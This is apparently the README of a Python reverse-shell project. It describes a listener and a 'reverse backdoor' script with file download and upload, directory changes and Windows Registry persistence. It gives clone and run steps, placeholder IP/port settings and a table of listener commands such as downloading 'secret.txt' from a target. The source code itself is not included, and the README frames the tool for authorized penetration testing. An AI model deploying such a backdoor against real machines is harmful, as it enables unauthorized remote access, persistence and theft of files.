## :smiling_imp: Python Reverse Shell
This is a Python-based reverse shell tool consisting of a listener and a reverse backdoor script.

It is designed for authorized penetration testing and cybersecurity training in controlled environments.

---

## ⚠ Disclaimer
    This project is for educational purposes only.

    Do NOT run it on any system or network without explicit permission.

    Unauthorized use may be illegal in your country and can result in severe criminal charges.

---

## 📌 Features

    Reliable JSON-based command exchange.

    File upload and download support.

    Ability to change the target’s working directory.

    Simulates persistence via Windows Registry.

    Works with Python 2 and Python 3.

    IP and Port easily configurable in the code.

---

## 🛠 Installation
Clone the repository:
``` bash
git clone https://github.com/Nozarashi-1/python-backdoor.git
cd python-reverse-shell
```
---

## 🚀 Usage
1. Start the Listener
Edit listener.py and set:
``` bash
my_listener = Listener("YOUR_IP", PORT)
Replace YOUR_IP with your testing machine’s IP and PORT with a free TCP port.
```

Run:
``` bash
python listener.py
```
2. Deploy the Backdoor
Edit reverse_backdoor.py and set:
``` bash
my_backdoor = Backdoor("YOUR_IP", PORT)
```
Run:
``` bash
python reverse_backdoor.py
```
---

## 📂 Command Overview (From Listener Side)
| Command           | Description                        | Example               |
| ----------------- | ---------------------------------- | --------------------- |
| `cd <path>`       | Change working directory on target | `cd C:\Windows`       |
| `download <file>` | Download file from target          | `download secret.txt` |
| `upload <file>`   | Upload file to target              | `upload test.txt`     |
| `exit`            | Close the connection               | `exit`                |

---

## ⚖ Legal Notice
    You are 100% responsible for how you use this code.
   
    The authors take no responsibility for any misuse.

    Only use it in environments where you have written authorization.
